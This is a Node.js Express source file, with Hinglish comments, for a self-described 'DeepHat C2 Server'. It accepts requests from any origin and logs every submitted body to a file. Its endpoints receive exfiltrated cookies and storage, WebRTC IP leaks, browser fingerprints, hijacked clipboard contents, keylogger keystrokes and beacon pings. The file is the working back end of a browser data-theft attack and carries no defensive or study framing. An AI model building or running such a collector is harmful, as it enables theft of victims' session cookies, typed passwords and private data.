const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware: JSON data ko parse karna (10MB tak support)
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// Middleware: CORS enable karna (Allow any origin)
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(204);
    }
    next();
});

// Helper Function: Log ko file me append karna
function saveLog(endpoint, data) {
    const logDir = 'logs';
    const logFile = path.join(logDir, 'deep-hat-logs.txt');
    
    // Agar logs folder nahi hai, toh banayein
    if (!fs.existsSync(logDir)) {
        fs.mkdirSync(logDir, { recursive: true });
    }

    const timestamp = new Date().toISOString();
    const logEntry = `\n[${timestamp}] ${endpoint}\n${JSON.stringify(data, null, 2)}\n${'='.repeat(50)}\n`;
    
    fs.appendFile(logFile, logEntry, (err) => {
        if (err) {
            console.error('Error writing to log file:', err);
        } else {
            console.log(`[LOG] Saved to ${logFile}`);
        }
    });
}

// Middleware: Har request ko console aur file me log karein
app.use((req, res, next) => {
    const timestamp = new Date().toISOString();
    console.log(`\n[${timestamp}] ${req.method} ${req.url}`);
    
    if (req.body && Object.keys(req.body).length > 0) {
        console.log('BODY:', JSON.stringify(req.body, null, 2));
        saveLog(req.url, req.body);
    } else if (req.query && Object.keys(req.query).length > 0) {
        console.log('QUERY:', JSON.stringify(req.query, null, 2));
        saveLog(req.url, req.query);
    }
    
    next();
});

// ==========================================
// ROUTES
// ==========================================

// 1. Health Check (Isse aap server live hai ya nahi check kar sakte)
app.get('/', (req, res) => {
    res.json({ 
        status: 'online', 
        message: 'DeepHat C2 Server is Active',
        endpoints: ['/exfil', '/ip-leak', '/fingerprint', '/clipboard', '/keystrokes', '/ping']
    });
});

// 2. Main Data Exfiltration (Cookies, Storage, UA)
app.post('/exfil', (req, res) => {
    console.log('\n--- [MAIN EXFILTRATION] ---');
    res.json({ status: 'received', data: req.body });
});

// 3. WebRTC IP Leak
app.post('/ip-leak', (req, res) => {
    console.log('\n--- [WEBRTC IP LEAK] ---');
    res.json({ status: 'received', data: req.body });
});

// 4. Browser Fingerprinting
app.post('/fingerprint', (req, res) => {
    console.log('\n--- [FINGERPRINT] ---');
    res.json({ status: 'received', data: req.body });
});

// 5. Clipboard Hijacking
app.post('/clipboard', (req, res) => {
    console.log('\n--- [CLIPBOARD INTERCEPT] ---');
    res.json({ status: 'received', data: req.body });
});

// 6. Keylogging
app.post('/keystrokes', (req, res) => {
    console.log('\n--- [KEYSTROKES CAPTURED] ---');
    res.json({ status: 'received', data: req.body });
});

// 7. Persistent Beacon (Ping)
app.get('/ping', (req, res) => {
    console.log('\n--- [BEACON PING] ---');
    console.log('Session ID:', req.query.session);
    res.json({ status: 'alive', timestamp: new Date().toISOString() });
});

// 8. Fallback: Agar koi unknown route hit ho
app.use((req, res) => {
    res.status(404).json({ error: 'Endpoint not found', available: ['/exfil', '/ip-leak', '/fingerprint', '/clipboard', '/keystrokes', '/ping'] });
});

// 9. Error Handler
app.use((err, req, res, next) => {
    console.error('Server Error:', err);
    res.status(500).json({ error: 'Internal Server Error' });
});

// Start Server
app.listen(PORT, () => {
    console.log(`\n🕸️ DeepHat C2 Server running on port ${PORT}`);
    console.log(`📡 Endpoint: http://localhost:${PORT}`);
    console.log(`📂 Logs will be saved to: ./logs/deep-hat-logs.txt\n`);
});
